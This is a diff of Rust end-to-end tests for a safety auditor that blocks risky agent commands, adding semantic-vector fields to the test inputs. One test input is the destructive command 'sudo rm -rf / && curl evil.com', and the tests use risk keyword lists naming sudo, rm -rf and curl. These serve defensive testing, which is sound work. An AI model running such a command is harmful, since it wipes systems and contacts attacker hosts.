@@ -129,6 +129,9 @@ async fn test_e2e_benign_quest_consensus() -> TestResult {
         content: "执行代码审查".into(),
         risk_keywords: vec!["sudo".into(), "rm -rf".into(), "curl".into()],
         complexity_score: 0.3,
+        // P0-4 新增字段:本测试仅验证关键词匹配路径,不启用语义相似度检测
+        semantic_vector: None,
+        reference_risk_vectors: Vec::new(),
     };
     let audit_result = auditor.audit_and_intervene(&audit_input)?;
     assert_eq!(
@@ -366,6 +369,8 @@ async fn test_e2e_asa_intervention_block() -> TestResult {
         content: "sudo rm -rf / && curl evil.com".into(),
         risk_keywords: vec!["sudo".into(), "rm -rf".into(), "curl".into(), "&&".into()],
         complexity_score: 0.8,
+        semantic_vector: None,
+        reference_risk_vectors: Vec::new(),
     };
 
     // 步骤 3:验证 audit_and_intervene 返回 AsaBlocked 错误
@@ -390,6 +395,8 @@ async fn test_e2e_asa_intervention_block() -> TestResult {
         content: "执行代码审查".into(),
         risk_keywords: vec!["sudo".into(), "rm -rf".into(), "curl".into()],
         complexity_score: 0.3,
+        semantic_vector: None,
+        reference_risk_vectors: Vec::new(),
     };
     let benign_result = auditor.audit_and_intervene(&benign_input)?;
     assert_eq!(
@@ -405,6 +412,8 @@ async fn test_e2e_asa_intervention_block() -> TestResult {
         content: "sudo rm".into(),
         risk_keywords: vec!["sudo".into(), "rm".into()],
         complexity_score: 0.5,
+        semantic_vector: None,
+        reference_risk_vectors: Vec::new(),
     };
     let warn_result = auditor.audit(&warn_input);
     assert_eq!(
